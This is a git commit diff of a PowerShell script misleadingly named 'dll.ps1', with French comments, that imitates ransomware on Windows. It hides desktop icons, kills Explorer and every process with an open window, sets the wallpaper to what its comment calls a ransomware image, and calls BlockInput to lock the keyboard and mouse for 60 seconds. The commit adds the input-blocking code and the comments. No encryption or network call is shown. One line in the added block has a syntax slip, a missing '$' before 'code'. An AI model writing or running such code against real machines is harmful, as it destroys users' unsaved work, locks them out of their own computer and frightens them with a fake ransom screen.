e7f3d1bd1ebbf0b2b7305217a5f7b2bb300f4ce3
andrepnunes <58053186+andrepnunes@users.noreply.github.com>
2021-11-30 01:49:41 +0100

    Update dll.ps1

--- dll.ps1
+++ dll.ps1
@@ -1,3 +1,4 @@
+# fonction pour changer le fond d'ecran
 Function Set-WallPaper($Image) {
   New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value "10"  -Force 
   Add-Type -TypeDefinition @"
@@ -16,9 +17,30 @@ Function Set-WallPaper($Image) {
       $fWinIni = $UpdateIniFile -bor $SendChangeEvent
       $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
   }
+  
   $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
-  Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 
+  Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 # cacher icones desktop
   Get-Process "explorer" | Stop-Process
+  
+  # Changer fond d'ecran vers image ransomware
   Set-WallPaper -Image "C:\system32.png"
   
+  #fermer fenetres ouvertes
   Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | stop-process
+  
+  
+  # desactiver inputs
+  code = @"
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+"@
+
+$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
+
+function Disable-UserInput($seconds) {
+    $userInput::BlockInput($true)
+    Start-Sleep $seconds
+    $userInput::BlockInput($false)
+}
+
+Disable-UserInput -seconds 60 | Out-Null
